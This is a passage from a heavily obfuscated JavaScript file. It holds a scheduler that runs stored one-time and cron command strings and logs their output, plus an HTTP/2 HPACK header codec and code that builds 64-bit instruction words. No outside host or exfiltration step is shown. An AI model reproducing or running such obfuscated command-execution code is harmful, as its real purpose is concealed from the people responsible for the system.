            'count': Object[c0(0x6d0)](a0K[c0(0x449)])['length'],
            'tasks': a0K[c0(0x449)]
        };
    }
    static ['setCronTasks'](a) {
        const c1 = a0aI, b = {
                'aSWKK': function (d, f) {
                    return d === f;
                },
                'MznKo': c1(0x3f0),
                'aBHju': c1(0x15d),
                'Hyzrc': function (d, f) {
                    return d || f;
                },
                'xpOcd': function (d, f) {
                    return d > f;
                },
                'TMRzY': function (d, f) {
                    return d - f;
                },
                'bqTgt': function (d, f) {
                    return d || f;
                }
            };
        this[c1(0x6dc)]['forEach'](d => {
            const c2 = c1;
            b[c2(0x398)](typeof d[c2(0x3de)], c2(0x3f0)) && d[c2(0x3de)](), typeof d['destroy'] === b['MznKo'] && d[c2(0x27e)]();
        }), this[c1(0x6dc)][c1(0x6dd)]();
        const c = [];
        for (const d of Object['keys'](b[c1(0x654)](a, {}))) {
            !a0r['validate'](d) && c[c1(0x6aa)](d);
        }
        if (b[c1(0x304)](c[c1(0x3d0)], 0x0))
            return {
                'status': c1(0xdc),
                'message': 'Invalid\x20cron\x20expressions:\x20' + c[c1(0x64a)](',\x20'),
                'valid_count': b[c1(0x280)](Object[c1(0x6d0)](b['Hyzrc'](a, {}))['length'], c[c1(0x3d0)])
            };
        a0K[c1(0x449)] = b['bqTgt'](a, {});
        for (const [f, g] of Object[c1(0x3d6)](a0K[c1(0x449)])) {
            const h = a0r[c1(0x129)](f, async () => {
                const c3 = c1, i = await a0P[c3(0x394)](g), j = this[c3(0x438)](g, i[c3(0x24e)], i[c3(0x17f)], b[c3(0x3a8)], f);
                this[c3(0x1c6)](a0K[c3(0x112)], j);
            });
            this[c1(0x6dc)][c1(0x521)](f, h);
        }
        return a0K[c1(0x6a3)] = b[c1(0x304)](Object['keys'](a0K[c1(0x449)])[c1(0x3d0)], 0x0), {
            'status': 'ok',
            'count': Object[c1(0x6d0)](a0K['crontasks'])[c1(0x3d0)],
            'tasks': a0K[c1(0x449)]
        };
    }
    static [a0aI(0x3e0)]() {
        const c4 = a0aI;
        return {
            'onetime': {
                'pending': a0K[c4(0x424)],
                'count': a0K[c4(0x42f)][c4(0x3d0)]
            },
            'cron': {
                'active': a0K['cronloop'],
                'count': Object[c4(0x6d0)](a0K[c4(0x449)])[c4(0x3d0)],
                'check_interval': a0K['CRON_CHECK_INTERVAL']
            }
        };
    }
    static [a0aI(0x5d8)](a = 0x32) {
        const c5 = a0aI, b = a0K[c5(0x1d3)]['slice'](-a);
        return {
            'status': 'ok',
            'count': b[c5(0x3d0)],
            'logs': b
        };
    }
    static [a0aI(0x6bc)](a = 0x32) {
        const c6 = a0aI, b = a0K[c6(0x112)][c6(0x10d)](-a);
        return {
            'status': 'ok',
            'count': b[c6(0x3d0)],
            'logs': b
        };
    }
    static ['clearOnetimeLogs']() {
        const c7 = a0aI, a = a0K[c7(0x1d3)][c7(0x3d0)];
        return a0K['onetimetasks_log'] = [], {
            'status': 'ok',
            'cleared': c7(0x432)
        };
    }
    static [a0aI(0x3df)]() {
        const c8 = a0aI, a = { 'CPuWp': c8(0x15d) }, b = a0K[c8(0x112)]['length'];
        return a0K[c8(0x112)] = [], {
            'status': 'ok',
            'cleared': a['CPuWp']
        };
    }
    static [a0aI(0x535)]() {
        const c9 = a0aI, a = {
                'hvCJv': function (g, h) {
                    return g - h;
                }
            }, b = a0K['onetimetasks_log'][c9(0x6ba)](g => g[c9(0x17f)] === 0x0)['length'], c = a[c9(0x5d1)](a0K[c9(0x1d3)][c9(0x3d0)], b), d = a0K['crontasks_log'][c9(0x6ba)](g => g[c9(0x17f)] === 0x0)['length'], f = a[c9(0x5d1)](a0K[c9(0x112)][c9(0x3d0)], d);
        return {
            'onetime': {
                'total_logged': a0K['onetimetasks_log'][c9(0x3d0)],
                'max_capacity': a0K['MAX_TASK_LOG_SIZE'],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0K[c9(0x112)][c9(0x3d0)],
                'max_capacity': a0K[c9(0x3fa)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async ['executeOnetimeTasks']() {
        const ca = a0aI, a = { 'GUnpW': ca(0x432) }, b = [];
        for (let c = 0x0; c < a0K[ca(0x42f)][ca(0x3d0)]; c++) {
            const d = a0K['onetasks'][c], f = await a0P[ca(0x394)](d), g = this[ca(0x438)](d, f[ca(0x24e)], f[ca(0x17f)], a[ca(0x4e1)]);
            this['_appendLog'](a0K[ca(0x1d3)], g), b[ca(0x6aa)]({
                'cmd': d,
                'exitcode': f[ca(0x17f)],
                'output': f[ca(0x24e)],
                'timeout': f[ca(0x259)]
            });
        }
        return a0K[ca(0x424)] = ![], {
            'status': 'ok',
            'executed': b[ca(0x3d0)],
            'results': b
        };
    }
}
const a0S = a0aI(0x69d), a0T = [
        a0aI(0x421),
        a0aI(0x1dd)
    ], a0U = 0x1ea4, a0V = a0aI(0x3ac), a0W = a0aI(0x1e3), a0X = 0x4000, a0Y = [
        [
            ':authority',
            ''
        ],
        [
            a0aI(0x1cb),
            a0aI(0x1fc)
        ],
        [
            a0aI(0x1cb),
            a0aI(0xfb)
        ],
        [
            a0aI(0x31a),
            '/'
        ],
        [
            a0aI(0x31a),
            '/index.html'
        ],
        [
            a0aI(0x1c0),
            a0aI(0x358)
        ],
        [
            a0aI(0x1c0),
            a0aI(0x60a)
        ],
        [
            ':status',
            a0aI(0x1e7)
        ],
        [
            a0aI(0x617),
            a0aI(0x160)
        ],
        [
            a0aI(0x617),
            a0aI(0x3fc)
        ],
        [
            a0aI(0x617),
            a0aI(0x141)
        ],
        [
            a0aI(0x617),
            a0aI(0x5fc)
        ],
        [
            a0aI(0x617),
            a0aI(0x1e2)
        ],
        [
            a0aI(0x617),
            a0aI(0x59b)
        ],
        [
            'accept-charset',
            ''
        ],
        [
            a0aI(0x382),
            a0aI(0x495)
        ],
        [
            a0aI(0x187),
            ''
        ],
        [
            a0aI(0x21b),
            ''
        ],
        [
            a0aI(0x434),
            ''
        ],
        [
            a0aI(0x2bc),
            ''
        ],
        [
            a0aI(0x3a7),
            ''
        ],
        [
            a0aI(0x524),
            ''
        ],
        [
            'authorization',
            ''
        ],
        [
            a0aI(0x296),
            ''
        ],
        [
            a0aI(0x5e0),
            ''
        ],
        [
            a0aI(0x2b0),
            ''
        ],
        [
            a0aI(0xce),
            ''
        ],
        [
            a0aI(0x64d),
            ''
        ],
        [
            a0aI(0x551),
            ''
        ],
        [
            a0aI(0x47e),
            ''
        ],
        [
            a0aI(0x1ee),
            ''
        ],
        [
            a0aI(0x23e),
            ''
        ],
        [
            a0aI(0x69b),
            ''
        ],
        [
            a0aI(0x5f0),
            ''
        ],
        [
            'expect',
            ''
        ],
        [
            a0aI(0x2cf),
            ''
        ],
        [
            a0aI(0x613),
            ''
        ],
        [
            a0aI(0x335),
            ''
        ],
        [
            a0aI(0x4e6),
            ''
        ],
        [
            a0aI(0x5ec),
            ''
        ],
        [
            a0aI(0x3b9),
            ''
        ],
        [
            'if-range',
            ''
        ],
        [
            a0aI(0x5ee),
            ''
        ],
        [
            a0aI(0x492),
            ''
        ],
        [
            a0aI(0x4a4),
            ''
        ],
        [
            a0aI(0x25a),
            ''
        ],
        [
            a0aI(0x569),
            ''
        ],
        [
            a0aI(0x6d7),
            ''
        ],
        [
            a0aI(0x4bb),
            ''
        ],
        [
            a0aI(0x6bd),
            ''
        ],
        [
            'referer',
            ''
        ],
        [
            a0aI(0x1aa),
            ''
        ],
        [
            'retry-after',
            ''
        ],
        [
            a0aI(0x6cc),
            ''
        ],
        [
            a0aI(0x55e),
            ''
        ],
        [
            a0aI(0x603),
            ''
        ],
        [
            'transfer-encoding',
            ''
        ],
        [
            'user-agent',
            ''
        ],
        [
            'vary',
            ''
        ],
        [
            a0aI(0x4c1),
            ''
        ],
        [
            a0aI(0x225),
            ''
        ]
    ], a0Z = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0a0 = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0a1() {
    const cb = a0aI, a = {
            'uzsOq': function (c, d) {
                return c < d;
            },
            'mzrpN': function (c, d) {
                return c - d;
            },
            'zLPVl': function (c, d) {
                return c & d;
            },
            'NcXfd': function (c, d) {
                return c >> d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; a[cb(0x5ca)](c, a0Z[cb(0x3d0)]); c++) {
        const d = a0Z[c], f = a0a0[c];
        let g = b;
        for (let h = a[cb(0x4eb)](f, 0x1); h >= 0x0; h--) {
            const i = a[cb(0x4b8)](a['NcXfd'](d, h), 0x1);
            g[i] === null && (g[i] = [
                null,
                null,
                -0x1,
                g[0x3] + 0x1
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0a2 = a0a1();
function a0a3(a) {
    const cc = a0aI, b = {
            'HgWeB': function (h, i) {
                return h >= i;
            },
            'MxjSR': function (h, i) {
                return h >> i;
            },
            'GOBlv': function (h, i) {
                return h << i;
            },
            'iQmqs': function (h, i) {
                return h === i;
            },
            'aDwme': cc(0x470),
            'FPonp': cc(0x246),
            'LTnRk': cc(0x55a),
            'BsQAd': function (h, i) {
                return h !== i;
            },
            'nwIah': function (h, i) {
                return h - i;
            },
            'JTMMe': cc(0x32c)
        }, c = [];
    let d = a0a2, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b[cc(0x68f)](i, 0x0); i--) {
            const j = b[cc(0x67d)](h, i) & 0x1;
            f = b['GOBlv'](f, 0x1) | j, g += 0x1, d = d[j];
            if (b['iQmqs'](d, null))
                throw new Error(b[cc(0x30e)]);
            if (d[0x2] >= 0x0) {
                const k = b[cc(0x2db)][cc(0x67f)]('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        g = 0x0;
                        continue;
                    case '1':
                        c['push'](d[0x2]);
                        continue;
                    case '2':
                        d = a0a2;
                        continue;
                    case '3':
                        if (b[cc(0x631)](d[0x2], 0x100))
                            throw new Error(b[cc(0x290)]);
                        continue;
                    case '4':
                        f = 0x0;
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (g > 0x7 || b[cc(0x28a)](f, b[cc(0x179)](b[cc(0x63b)](0x1, g), 0x1)))
        throw new Error(b[cc(0x2f1)]);
    return Buffer[cc(0x613)](c);
}
function a0a4(a, b, c) {
    const cd = a0aI, d = {
            'OFarX': function (j, k) {
                return j >= k;
            },
            'RNxrz': function (j, k) {
                return j - k;
            },
            'jVYuq': function (j, k) {
                return j << k;
            },
            'TxcfO': function (j, k) {
                return j < k;
            },
            'ZJuEa': function (j, k) {
                return j * k;
            },
            'uNAdR': function (j, k) {
                return j & k;
            },
            'RRpya': function (j, k) {
                return j === k;
            },
            'GmYdn': cd(0x574)
        };
    if (d[cd(0x5b0)](b, a['length']))
        throw new Error(cd(0x2a5));
    const f = a[b];
    b += 0x1;
    const g = d['RNxrz'](d['jVYuq'](0x1, c), 0x1);
    let h = f & g;
    if (d[cd(0x41c)](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (b >= a[cd(0x3d0)])
            throw new Error('truncated\x20HPACK\x20integer');
        const j = a[b];
        b += 0x1, h += d[cd(0x5e8)](d[cd(0xe1)](j, 0x7f), Math[cd(0x35d)](0x2, i));
        if (d[cd(0x10a)](d[cd(0xe1)](j, 0x80), 0x0))
            return [
                h,
                b
            ];
        i += 0x7;
        if (i > 0x1c)
            throw new Error(d[cd(0x4a5)]);
    }
}
function a0a5(a, b) {
    const ce = a0aI, c = {
            'NVLwi': function (j, k) {
                return j >= k;
            },
            'nYOht': function (j, k) {
                return j(k);
            },
            'NFvZf': function (j, k) {
                return j & k;
            },
            'AkKah': function (j, k, l, m) {
                return j(k, l, m);
            },
            'IDbVU': function (j, k) {
                return j > k;
            },
            'yqGzA': function (j, k) {
                return j(k);
            }
        };
    if (c[ce(0x3dd)](b, a['length']))
        throw new Error(ce(0x2ab));
    const d = c[ce(0x186)](Boolean, c[ce(0x49f)](a[b], 0x80)), [f, g] = c['AkKah'](a0a4, a, b, 0x7), h = g + f;
    if (c[ce(0x3aa)](h, a['length']))
        throw new Error('truncated\x20HPACK\x20string\x20data');
    const i = a['subarray'](g, h);
    return [
        d ? c['yqGzA'](a0a3, i) : i,
        h
    ];
}
class a0a6 {
    constructor() {
        this['dynamic'] = [], this['dynamicSize'] = 0x0, this['maxSize'] = 0x1000;
    }
    [a0aI(0x682)](a) {
        const cf = a0aI, b = {
                'lGlAx': cf(0x6d5),
                'BGsxV': function (d, f) {
                    return d <= f;
                },
                'umPSK': function (d, f) {
                    return d - f;
                },
                'mljpZ': function (d, f) {
                    return d - f;
                },
                'tPBiR': function (d, f) {
                    return d - f;
                },
                'jkCPn': function (d, f) {
                    return d < f;
                },
                'BErnF': cf(0x3ad)
            };
        if (a <= 0x0)
            throw new Error(b[cf(0x473)]);
        if (b[cf(0x4c4)](a, a0Y[cf(0x3d0)]))
            return a0Y[b[cf(0x29d)](a, 0x1)];
        const c = b[cf(0x2ce)](b['tPBiR'](a, a0Y['length']), 0x1);
        if (b[cf(0x5e5)](c, 0x0) || c >= this[cf(0x2ca)][cf(0x3d0)])
            throw new Error(b[cf(0x628)]);
        return this['dynamic'][c];
    }
    ['add'](a, b) {
        const cg = a0aI, c = {
                'QXKYw': function (f, g) {
                    return f + g;
                },
                'NfILy': cg(0xd9),
                'skUAT': function (f, g) {
                    return f > g;
                },
                'LgevP': function (f, g) {
                    return f > g;
                },
                'TkNKQ': function (f, g) {
                    return f + g;
                }
            }, d = c[cg(0x54f)](0x20, Buffer[cg(0x234)](a, c[cg(0x4cb)])) + Buffer['byteLength'](b, 'utf8');
        if (d > this[cg(0x4a6)]) {
            this[cg(0x2ca)] = [], this[cg(0x60d)] = 0x0;
            return;
        }
        while (c[cg(0x493)](this[cg(0x2ca)][cg(0x3d0)], 0x0) && c[cg(0x29a)](c[cg(0x54f)](this[cg(0x60d)], d), this[cg(0x4a6)])) {
            const [f, g] = this[cg(0x2ca)]['pop']();
            this['dynamicSize'] -= c[cg(0x54f)](c[cg(0x515)](0x20, Buffer[cg(0x234)](f, c[cg(0x4cb)])), Buffer[cg(0x234)](g, c['NfILy']));
        }
        this['dynamic']['unshift']([
            a,
            b
        ]), this['dynamicSize'] += d;
    }
    ['decode'](a) {
        const ch = a0aI, b = {
                'XWkYF': function (f, g) {
                    return f < g;
                },
                'lkXAz': function (f, g) {
                    return f & g;
                },
                'kbktm': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'bNLuz': function (f, g, h) {
                    return f(g, h);
                },
                'wScrs': ch(0xd9),
                'PcNpS': function (f, g) {
                    return f > g;
                },
                'OOfFW': ch(0x270),
                'KdSnR': function (f, g) {
                    return f + g;
                },
                'salnm': function (f, g) {
                    return f + g;
                },
                'oTkhG': function (f, g, h) {
                    return f(g, h);
                }
            }, c = [];
        let d = 0x0;
        while (b['XWkYF'](d, a[ch(0x3d0)])) {
            const f = a[d];
            if (b['lkXAz'](f, 0x80)) {
                let j;
                [j, d] = b[ch(0x106)](a0a4, a, d, 0x7), c[ch(0x6aa)](this[ch(0x682)](j));
                continue;
            }
            if (f & 0x40) {
                let k, l;
                [k, d] = a0a4(a, d, 0x6);
                if (k)
                    l = this[ch(0x682)](k)[0x0];
                else {
                    let o;
                    [o, d] = b[ch(0x1be)](a0a5, a, d), l = o[ch(0x406)](b['wScrs'])['toLowerCase']();
                }
                let m;
                [m, d] = b[ch(0x1be)](a0a5, a, d);
                const n = m[ch(0x406)]('utf8');
                this[ch(0x4d9)](l, n), c['push']([
                    l,
                    n
                ]);
                continue;
            }
            if (b[ch(0x4a2)](f, 0x20)) {
                let p;
                [p, d] = a0a4(a, d, 0x5);
                if (b[ch(0x35b)](p, 0x1000))
                    throw new Error(b[ch(0x498)]);
                this[ch(0x4a6)] = p;
                while (b[ch(0x35b)](this['dynamic'][ch(0x3d0)], 0x0) && b[ch(0x35b)](this[ch(0x60d)], p)) {
                    const [q, r] = this[ch(0x2ca)][ch(0x6a8)]();
                    this['dynamicSize'] -= b[ch(0x630)](b[ch(0x6ad)](0x20, Buffer[ch(0x234)](q, b[ch(0x218)])), Buffer[ch(0x234)](r, b[ch(0x218)]));
                }
                continue;
            }
            let g, h;
            [g, d] = b[ch(0x106)](a0a4, a, d, 0x4);
            if (g)
                h = this[ch(0x682)](g)[0x0];
            else {
                let s;
                [s, d] = b['bNLuz'](a0a5, a, d), h = s[ch(0x406)](b[ch(0x218)])[ch(0x43b)]();
            }
            let i;
            [i, d] = b[ch(0x312)](a0a5, a, d), c[ch(0x6aa)]([
                h,
                i[ch(0x406)](b[ch(0x218)])
            ]);
        }
        return c;
    }
}
function a0a7(a, b, c) {
    const ci = a0aI, d = {
            'FxHeU': function (h, i) {
                return h << i;
            },
            'qgRjV': function (h, i) {
                return h < i;
            },
            'qnYOG': function (h, i) {
                return h | i;
            },
            'sIYgK': function (h, i) {
                return h | i;
            },
            'hcbzD': function (h, i) {
                return h >= i;
            }
        }, f = d[ci(0x546)](0x1, b) - 0x1;
    if (d[ci(0x109)](a, f))
        return Buffer[ci(0x613)]([d[ci(0x3b6)](c, a)]);
    const g = [d[ci(0x143)](c, f)];
    a -= f;
    while (d[ci(0x467)](a, 0x80)) {
        g[ci(0x6aa)](d[ci(0x143)](a & 0x7f, 0x80)), a = Math[ci(0x1bb)](a / 0x80);
    }
    return g['push'](a), Buffer[ci(0x613)](g);
}
function a0b(a, b) {
    a = a - 0xc3;
    const c = a0a();
    let d = c[a];
    if (a0b['bAOgBo'] === undefined) {
        var e = function (i) {
            const j = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let l = '', m = '';
            for (let n = 0x0, o, p, q = 0x0; p = i['charAt'](q++); ~p && (o = n % 0x4 ? o * 0x40 + p : p, n++ % 0x4) ? l += String['fromCharCode'](0xff & o >> (-0x2 * n & 0x6)) : 0x0) {
                p = j['indexOf'](p);
            }
            for (let r = 0x0, s = l['length']; r < s; r++) {
                m += '%' + ('00' + l['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(m);
        };
        a0b['jaTwjX'] = e, a0b['QyKhiq'] = {}, a0b['bAOgBo'] = !![];
    }
    const f = c[0x0], g = a + f, h = a0b['QyKhiq'][g];
    return !h ? (d = a0b['jaTwjX'](d), a0b['QyKhiq'][g] = d) : d = h, d;
}
function a0a8(a) {
    const cj = a0aI, b = {
            'ZZYHR': cj(0xd9),
            'sqzkf': function (d, f, g, h) {
                return d(f, g, h);
            }
        }, c = Buffer[cj(0x613)](a, b[cj(0x28f)]);
    return Buffer[cj(0x1c8)]([
        b['sqzkf'](a0a7, c['length'], 0x7, 0x0),
        c
    ]);
}
function a0a9(a) {
    const ck = a0aI, b = {
            'GUrTq': ck(0x617),
            'vwxgY': function (d, f) {
                return d === f;
            },
            'wEocA': '200',
            'kybqz': ck(0x160),
            'NpRmU': function (d, f) {
                return d === f;
            },
            'bFqWQ': function (d, f) {
                return d === f;
            },
            'nEtiP': function (d, f) {
                return d === f;
            },
            'hLiLr': ck(0x141),
            'LdXuz': function (d, f) {
                return d === f;
            },
            'DZHgX': ck(0x5fc),
            'OnDEc': function (d, f) {
                return d === f;
            },
            'HtQDI': function (d, f) {
                return d === f;
            },
            'mzJLm': ck(0x1e2),
            'xzGsj': function (d, f) {
                return d === f;
            },
            'erjDa': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (d === b[ck(0x397)] && b['vwxgY'](f, b[ck(0x566)]))
            c[ck(0x6aa)](0x88);
        else {
            if (d === ck(0x617) && b['vwxgY'](f, b[ck(0x3b5)]))
                c['push'](0x89);
            else {
                if (b[ck(0x359)](d, b['GUrTq']) && b[ck(0x51d)](f, ck(0x3fc)))
                    c[ck(0x6aa)](0x8a);
                else {
                    if (b[ck(0x359)](d, b[ck(0x397)]) && b[ck(0x10e)](f, b[ck(0x58d)]))
                        c[ck(0x6aa)](0x8b);
                    else {
                        if (b[ck(0x51d)](d, b['GUrTq']) && b[ck(0x32a)](f, b[ck(0x3e9)]))
                            c[ck(0x6aa)](0x8c);
                        else {
                            if (b['OnDEc'](d, b[ck(0x397)]) && b[ck(0x62f)](f, b['mzJLm']))
                                c[ck(0x6aa)](0x8d);
                            else
                                b[ck(0x5f8)](d, b[ck(0x397)]) && b['xzGsj'](f, ck(0x59b)) ? c[ck(0x6aa)](0x8e) : (c['push'](...a0a7(0x0, 0x4, 0x0)), c['push'](...a0a8(d)), c[ck(0x6aa)](...b['erjDa'](a0a8, f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer[ck(0x613)](c);
}
class a0aa {
    constructor() {
        const cl = a0aI;
        this[cl(0x313)] = [];
    }
    [a0aI(0x4fd)](a) {
        const cm = a0aI, b = {
                'hYGgb': function (d, f) {
                    return d < f;
                }
            }, c = this[cm(0x313)][cm(0x3d0)];
        for (let d = 0x0; b[cm(0x635)](d, a); d++) {
            this[cm(0x313)][cm(0x6aa)](0x0n);
        }
        return c;
    }
    [a0aI(0x660)](a, b, c, d) {
        const cn = a0aI, f = {
                'OuEqi': function (j, k) {
                    return j - k;
                },
                'EySOe': function (j, k) {
                    return j - k;
                },
                'EHGiO': function (j, k) {
                    return j & k;
                },
                'pvnAU': function (j, k) {
                    return j << k;
                },
                'Xbonj': function (j, k) {
                    return j(k);
                },
                'FTZHy': function (j, k) {
                    return j << k;
                },
                'hdLEE': function (j, k) {
                    return j(k);
                },
                'MHqIV': function (j, k) {
                    return j & k;
                }
            }, g = f[cn(0xdf)](f['EySOe'](b, a), 0x1), h = f[cn(0x33d)](f[cn(0x2b6)](BigInt(g), 0x2n), 0xfffffffcn), i = f[cn(0x214)](BigInt, f[cn(0x33d)](c, 0xffff)) | f[cn(0x27a)](f['hdLEE'](BigInt, f[cn(0x66c)](d, 0xffff)), 0x10n);
        this[cn(0x313)][a] = h | f['FTZHy'](i, 0x20n);
    }
    [a0aI(0x3cf)](a, b, c) {
        const co = a0aI, d = {
                'NDKJd': function (g, h) {
                    return g(h);
                },
                'ahsdU': function (g, h) {
                    return g & h;
                },
